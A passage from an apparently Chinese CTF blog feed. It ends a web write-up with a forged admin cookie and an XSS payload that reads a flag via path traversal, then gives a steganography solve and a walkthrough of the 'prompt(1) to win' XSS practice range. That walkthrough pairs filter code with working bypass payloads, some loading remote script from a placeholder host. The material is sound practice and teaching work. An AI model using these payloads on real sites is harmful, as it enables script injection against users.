class="line">Content-Length: 301</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;189e45c2-c278-4154-a99a-f60a5dcb08c1.node4.buuoj.cn:81</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;92.0.4515.159 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;189e45c2-c278-4154-a99a-f60a5dcb08c1.node4.buuoj.cn:81&#x2F;admin</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: UM_distinctid&#x3D;17b29115fe6634-088485bbacdf7c-4343363-1fa400-17b29115fe7d9a; token&#x3D;s%3Aj%3A%7B%22username%22%3A%22admin%22%2C%22files%22%3A%5B%5D%2C%22isAdmin%22%3Atrue%7D.F56WSi1msokS7QwqhYWcJm%2FBhe1UiZ%2FxOtKnM%2BaehVU</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">content[]&#x3D;%3Cscript%3Evar%20url%3D%22http%3A%2F%2F127%2E0%2E0%2E1%3A8888%2Fapi%2Ffiles%3Fusername%3Dadmin%26filename%3D%2E%2E%2Ffiles%2Fflag%26checksum%3Dbe5a14a8e504a66979f6938338b0662c%22%3Bquery%3Dnew%20XMLHttpRequest%28%29%3Bquery%2Eopen%28%27get%27%2Curl%29%3Bquery%2Esend%28%29%3B%3C%2Fscript%3E</span><br></pre></td></tr></table></figure><p>flag:</p><blockquote><p>flag{713393c3-9f68-4719-bac4-649c9cf12eb9}</p></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="鸣雏恋"><a href="#鸣雏恋" class="headerlink" title="鸣雏恋"></a>鸣雏恋</h3><p>转 zip 格式打开压缩包，在 _rels 中发现 <code>key.txt</code> 和 <code>love.zip</code>。</p><p>先解 key，key 为零宽字节隐写，<a href="http://330k.github.io/misc_tools/unicode_steganography.html">解码网站</a></p><blockquote><p>Because I like naruto best</p></blockquote><p>解压图片后发现有大量图片，但是仅有 雏田 和 鸣人 头像，且图片数据分别相同，猜测为 01 二进制，写脚本输出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">mark0 = Image.<span class="built_in">open</span>(<span class="string">&#x27;./out/0.png&#x27;</span>).convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">m0 = mark0.size</span><br><span class="line">mark1 = Image.<span class="built_in">open</span>(<span class="string">&#x27;./out/1.png&#x27;</span>).convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">m1 = mark1.size</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">129488</span>):</span><br><span class="line">    print(<span class="string">f&quot;[+]New is img<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    mark = Image.<span class="built_in">open</span>(<span class="string">f&#x27;./out/<span class="subst">&#123;i&#125;</span>.png&#x27;</span>).convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> mark.size == m0:</span><br><span class="line">        result += <span class="string">&quot;0&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p>得到的二进制逐步解码后即可得到图片</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210821160253239.png"></p><p>flag</p><blockquote><p>flag{57dd74fb21bb1aee50f19421bf836f23}</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&quot;ezyii&quot;&gt;&lt;a href=&quot;#ezyii&quot; class=&quot;headerlink&quot; title=&quot;ezyii&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="WriteUp" scheme="https://rossweisse.github.io/categories/WriteUp/"/>
    
    
    <category term="CTF" scheme="https://rossweisse.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>prompt(1) to win - XSS靶场练习</title>
    <link href="https://rossweisse.github.io/2021/08/17/web%E5%AD%A6%E4%B9%A0/prompt-1-to-win/"/>
    <id>https://rossweisse.github.io/2021/08/17/web%E5%AD%A6%E4%B9%A0/prompt-1-to-win/</id>
    <published>2021-08-17T13:51:38.000Z</published>
    <updated>2021-08-17T14:03:13.460Z</updated>
    
    <content type="html"><![CDATA[<h1 id="prompt-1-to-win-XSS靶场练习"><a href="#prompt-1-to-win-XSS靶场练习" class="headerlink" title="prompt(1) to win - XSS靶场练习"></a>prompt(1) to win - XSS靶场练习</h1><p>接触的比赛越多越发觉自己的实力还是太弱了，还是要努力变强。</p><p>一直对XSS的理解很模糊，主要还是没做过多少这类的类型题，在谭总那找到个靶场打算开始练练。</p><p>开始开始！</p><h2 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h2><p>prompt(1) to win这个在线靶场能够直观的查看自己的XSS代码被过滤后的结果，比较方便练习。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210814131646681.png"></p><hr><h2 id="0x0"><a href="#0x0" class="headerlink" title="0x0"></a>0x0</h2><p>第一关没过滤东西，只需要闭合一下前面的<code>\&quot;</code>就行了。</p><blockquote><p>&quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;</p></blockquote><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210814131959530.png"></p><hr><h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><p>对于过滤<code>&lt;</code>和<code>&gt;</code>中的内容时，可以使用<code>&lt;BODY</code>标签进行绕过<code>&lt;BODY onload=&quot;prompt(1)&quot;</code></p><blockquote><p>onload 事件在页面载入完成后立即触发。</p></blockquote><p>或者使用<code>&lt;img</code>标签进行绕过<code>&lt;img src=# onerror=&quot;prompt(1)&quot;</code></p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210814132452447.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;BODY onload&#x3D;&quot;prompt(1)&quot;</span><br><span class="line">      </span><br><span class="line">&lt;img src&#x3D;# onerror&#x3D;&quot;prompt(1)&quot;</span><br></pre></td></tr></table></figure><hr><h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h2><p>这关把<code>=</code> 和 <code>(</code>ban掉了，但是可以使用svg标签绕过</p><blockquote><p>SVG属于支持XML解析，所以那么我们就很好理解了，因为下xml支持在标签内解析HTML实体字符，所以在在XML中<code>&amp;#40;</code>会被解析成<code>（</code></p></blockquote><p><a href="https://tool.oschina.net/encode">编码网站</a></p><p><a href="http://pupiles.com/xss.html">浅谈XSS的小技巧与浏览器编码</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//                      v-- frowny face</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[=(]/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ok seriously, disallows equal signs and open parenthesis</span></span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">prompt<span class="symbol">&amp;#40;</span>1)</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// filter potential comment end delimiters</span></span><br><span class="line">    input = input.replace(<span class="regexp">/-&gt;/g</span>, <span class="string">&#x27;_&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// comment the input to avoid script execution</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;!-- &#x27;</span> + input + <span class="string">&#x27; --&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关把输入口放在了注释标签中，且把注释标签的闭合过滤了，找找其他的闭合。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;</span><br><span class="line">&lt;!-- --!&gt; 2012年后可用</span><br><span class="line">&#x2F;**&#x2F;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>prompt(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><hr><h2 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// make sure the script belongs to own site</span></span><br><span class="line">    <span class="comment">// sample script: http://prompt.ml/js/test.js</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/^(?:https?:)?\/\/prompt\.ml\//i</span>.test(<span class="built_in">decodeURIComponent</span>(input))) &#123;</span><br><span class="line">        <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">        script.src = input;</span><br><span class="line">        <span class="keyword">return</span> script.outerHTML;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Invalid resource.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关利用正则对字符串进行了过滤，开头必须为<code>http://prompt.ml/</code>。</p><p>原本以为是可以在中间构造语句闭合进行绕过的，但是发现会转为实体字符，这条线走不通。</p><p>看了看师傅们的wp，浏览器是支持这种url写法的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;username:password@attacker.com，但是https:&#x2F;&#x2F;username:password&#x2F;@attacker.com不行，这里由于用了decodeURIComponent，所以可以用%2f解码绕过。</span><br></pre></td></tr></table></figure><p>这里要用到自己的服务器，直接传个<code>prompt(1)</code>的js文件上去，然后访问。</p><p>tips：这种url写法chrome并不支持，火狐还可以用。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210817131241835.png"></p><p>还有一种方法是直接开phpstudy的服务器，这样就可以不用自己的服务器打。</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;prompt.ml%2f@localhost&#x2F;xss.js</span><br></pre></td></tr></table></figure><hr><h2 id="0x5"><a href="#0x5" class="headerlink" title="0x5"></a>0x5</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// apply strict filter rules of level 0</span></span><br><span class="line">    <span class="comment">// filter &quot;&gt;&quot; and event handlers</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&gt;|on.+?=|focus/gi</span>, <span class="string">&#x27;_&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;input value=&quot;&#x27;</span> + input + <span class="string">&#x27;&quot; type=&quot;text&quot;&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关过滤了<code>&gt;</code>、<code>onxxxx=</code>、<code>focus</code>，可以用<code>&quot;</code>闭合<code>value</code>，然后自定义<code>type=&quot;image&quot;</code>，最后利用换行符绕过<code>onxxxx=</code></p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; type&#x3D;&quot;image&quot; src&#x3D;# onerror&#x3D;&quot;prompt(1)</span><br></pre></td></tr></table></figure><hr><h2 id="0x6"><a href="#0x6" class="headerlink" title="0x6"></a>0x6</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    &#x2F;&#x2F; let&#39;s do a post redirection</span><br><span class="line">    try &#123;</span><br><span class="line">        &#x2F;&#x2F; pass in formURL#formDataJSON</span><br><span class="line">        &#x2F;&#x2F; e.g. http:&#x2F;&#x2F;httpbin.org&#x2F;post#&#123;&quot;name&quot;:&quot;Matt&quot;&#125;</span><br><span class="line">        var segments &#x3D; input.split(&#39;#&#39;);</span><br><span class="line">        var formURL &#x3D; segments[0];</span><br><span class="line">        var formData &#x3D; JSON.parse(segments[1]);</span><br><span class="line"></span><br><span class="line">        var form &#x3D; document.createElement(&#39;form&#39;);</span><br><span class="line">        form.action &#x3D; formURL;</span><br><span class="line">        form.method &#x3D; &#39;post&#39;;</span><br><span class="line"></span><br><span class="line">        for (var i in formData) &#123;</span><br><span class="line">            var input &#x3D; form.appendChild(document.createElement(&#39;input&#39;));</span><br><span class="line">            input.name &#x3D; i;</span><br><span class="line">            input.setAttribute(&#39;value&#39;, formData[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return form.outerHTML + &#39;                         \n\</span><br><span class="line">&lt;script&gt;                                                  \n\</span><br><span class="line">    &#x2F;&#x2F; forbid javascript: or vbscript: and data: stuff    \n\</span><br><span class="line">    if (!&#x2F;script:|data:&#x2F;i.test(document.forms[0].action)) \n\</span><br><span class="line">        document.forms[0].submit();                       \n\</span><br><span class="line">    else                                                  \n\</span><br><span class="line">        document.write(&quot;Action forbidden.&quot;)               \n\</span><br><span class="line">&lt;&#x2F;script&gt;                                                 \n\</span><br><span class="line">        &#39;;</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        return &#39;Invalid form data.&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关通过demo发现总共有<code>action</code>、<code>method</code>、<code>name</code>和<code>value</code>是可控的。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://httpbin.org/post&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Matt&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span>                         </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>                                                  </span><br><span class="line"><span class="javascript">    <span class="comment">// forbid javascript: or vbscript: and data: stuff    </span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (!<span class="regexp">/script:|data:/i</span>.test(<span class="built_in">document</span>.forms[<span class="number">0</span>].action)) </span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.forms[<span class="number">0</span>].submit();                       </span></span><br><span class="line"><span class="javascript">    <span class="keyword">else</span>                                                  </span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="string">&quot;Action forbidden.&quot;</span>)               </span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>if语句通过了，则会submit我们的action值。这里可以利用 <code>javascript:</code> js伪协议进行js代码执行，然后可以通过控制 <code>name</code> 的值，破坏窗口的action属性，进而绕过 <code>if</code>。</p><p>上测试:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;javascript:prompt(1)&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;action&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">        alert(<span class="built_in">document</span>.forms[<span class="number">0</span>].action)</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210817145123855.png"></p><p>可以发现输出了我们想要的东西。</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:prompt(1)#&#123;&quot;action&quot;:&quot;Matt&quot;&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="0x7"><a href="#0x7" class="headerlink" title="0x7"></a>0x7</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span>(<span class="params">title</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// title can only contain 12 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;p class=&quot;comment&quot; title=&quot;&#x27;</span> + title.slice(<span class="number">0</span>, <span class="number">12</span>) + <span class="string">&#x27;&quot;&gt;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    &#125;).join(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关限制了只能有12个字符，可以用js的多行注释来注释掉多出来的标签。</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;&#x2F;*#*&#x2F;prompt(1&#x2F;*#*&#x2F;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>result:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;p class&#x3D;&quot;comment&quot; title&#x3D;&quot;&quot;&gt;&lt;script&gt;&#x2F;*&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p class&#x3D;&quot;comment&quot; title&#x3D;&quot;*&#x2F;prompt(1&#x2F;*&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p class&#x3D;&quot;comment&quot; title&#x3D;&quot;*&#x2F;)&lt;&#x2F;script&gt;&quot;&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure><p>tips：注释符也算在长度中。</p><hr><h2 id="0x8"><a href="#0x8" class="headerlink" title="0x8"></a>0x8</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// prevent input from getting out of comment</span></span><br><span class="line">    <span class="comment">// strip off line-breaks and stuff</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[\r\n&lt;/&quot;]/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;                                \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">    // console.log(&quot;&#x27;</span> + input + <span class="string">&#x27;&quot;);        \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt; &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题绕单行注释，可以换行进行绕过，但是ban 掉了两个换行符，这里可以用到 unicode 编码进行绕过，然后用 js 的注释 <code>-&gt;</code>注释掉后面的 <code>&quot;);</code></p><blockquote><p>\u2028，Unicode行分隔符</p><p>\u2029，Unicode段落分隔符</p></blockquote><p>这题好像有坑，无法复现，过！</p><hr><h2 id="0x9"><a href="#0x9" class="headerlink" title="0x9"></a>0x9</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// filter potential start-tags</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">&#x27;&lt;_$1&#x27;</span>);</span><br><span class="line">    <span class="comment">// use all-caps for heading</span></span><br><span class="line">    input = input.toUpperCase();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sample input: you shall not pass! =&gt; YOU SHALL NOT PASS!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>toUpperCase()</code>存在漏洞，不仅会转换英文字母，也会转换一些 <code>Unicode</code> 字符，比如 <code>ſ</code> 传入后可转换为相似的 <code>S</code> ，这样就可以绕过开始的 <code>replace</code>。</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſcript src&#x3D;&quot;YOUR_IP&#x2F;xss.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><hr><h2 id="0xA"><a href="#0xA" class="headerlink" title="0xA"></a>0xA</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// (╯°□°）╯︵ ┻━┻</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/prompt/g</span>, <span class="string">&#x27;alert&#x27;</span>);</span><br><span class="line">    <span class="comment">// ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/script&gt; &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关比较简单，就把单引号替换为空，只要在 <code>prompt(1)</code> 中间加个单引号就行了。</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pro&#39;mpt(1)</span><br></pre></td></tr></table></figure><hr><h2 id="0xB"><a href="#0xB" class="headerlink" title="0xB"></a>0xB</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// name should not contain special characters</span></span><br><span class="line">    <span class="keyword">var</span> memberName = input.replace(<span class="regexp">/[[|\s+*/\\&lt;&gt;&amp;^:;=~!%-]/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// data to be parsed as JSON</span></span><br><span class="line">    <span class="keyword">var</span> dataString = <span 